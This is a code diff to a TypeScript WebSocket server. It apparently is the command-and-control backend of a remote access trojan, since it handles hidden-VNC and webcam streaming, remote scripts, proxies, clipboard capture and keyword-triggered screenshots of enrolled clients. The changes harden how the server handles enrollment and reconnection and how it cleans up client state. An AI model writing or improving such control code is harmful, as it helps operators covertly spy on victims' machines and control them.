@@ -163,6 +163,7 @@ export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLif
 
   ws.send(encodeMessage({ type: "enrollment_challenge", nonce: nonceBase64 }));
 
+  clearEnrollmentTimeout(id);
   const timeout = setTimeout(() => {
     enrollmentTimeouts.delete(id);
     try {
@@ -271,6 +272,11 @@ export async function handleWebSocketMessage(
           }
         }
 
+        if (enrollmentStatus !== "approved" && enrollmentStatus !== "denied" && enrollmentStatus !== "pending") {
+          logger.warn(`[purgatory] unexpected enrollment_status "${enrollmentStatus}" for ${ws.data.clientId}, treating as pending`);
+          enrollmentStatus = "pending";
+        }
+
         const resolvedId = ws.data.clientId;
         const buildTag = typeof (payload as any).buildTag === "string"
           ? (payload as any).buildTag.trim()
@@ -337,7 +343,7 @@ export async function handleWebSocketMessage(
             ip: ip || undefined,
             country,
           });
-          try { ws.close(4001, "pending"); } catch {}
+          setTimeout(() => { try { ws.close(4001, "pending"); } catch {} }, 100);
           return;
         }
 
@@ -347,6 +353,23 @@ export async function handleWebSocketMessage(
           try { existingClient.ws.close(4004, "superseded"); } catch {}
           clientManager.deleteClient(resolvedId);
           clearEnrollmentTimeout(resolvedId);
+          stopAllProxiesForClient(resolvedId);
+          deps.clearPendingNotificationScreenshots(resolvedId);
+          deps.clearClientPluginState(resolvedId);
+          for (const [cmdId, pending] of deps.pendingScripts) {
+            if (pending.clientId === resolvedId) {
+              clearTimeout(pending.timeout);
+              pending.resolve({ ok: false, error: "Client reconnected (superseded)" });
+              deps.pendingScripts.delete(cmdId);
+            }
+          }
+          for (const [cmdId, pending] of deps.pendingCommandReplies) {
+            if (pending.clientId === resolvedId) {
+              clearTimeout(pending.timeout);
+              pending.resolve({ ok: false, message: "Client reconnected (superseded)" });
+              deps.pendingCommandReplies.delete(cmdId);
+            }
+          }
           deps.rdStreamingState.delete(resolvedId);
           deps.hvncStreamingState.delete(resolvedId);
           deps.webcamStreamingState.delete(resolvedId);
@@ -380,17 +403,21 @@ export async function handleWebSocketMessage(
         });
 
         const notificationConfig = deps.getNotificationConfig();
-        ws.send(
-          encodeMessage({
-            type: "hello_ack",
-            id: resolvedId,
-            notification: {
-              keywords: notificationConfig.keywords || [],
-              minIntervalMs: notificationConfig.minIntervalMs || 8000,
-              clipboardEnabled: notificationConfig.clipboardEnabled || false,
-            },
-          }),
-        );
+        try {
+          ws.send(
+            encodeMessage({
+              type: "hello_ack",
+              id: resolvedId,
+              notification: {
+                keywords: notificationConfig.keywords || [],
+                minIntervalMs: notificationConfig.minIntervalMs || 8000,
+                clipboardEnabled: notificationConfig.clipboardEnabled || false,
+              },
+            }),
+          );
+        } catch (sendErr) {
+          logger.warn(`[purgatory] failed to send hello_ack to ${resolvedId}: ${sendErr}`);
+        }
 
         handleHello(infoObj, payload, ws, ip);
         clientManager.addClient(infoObj.id, infoObj);
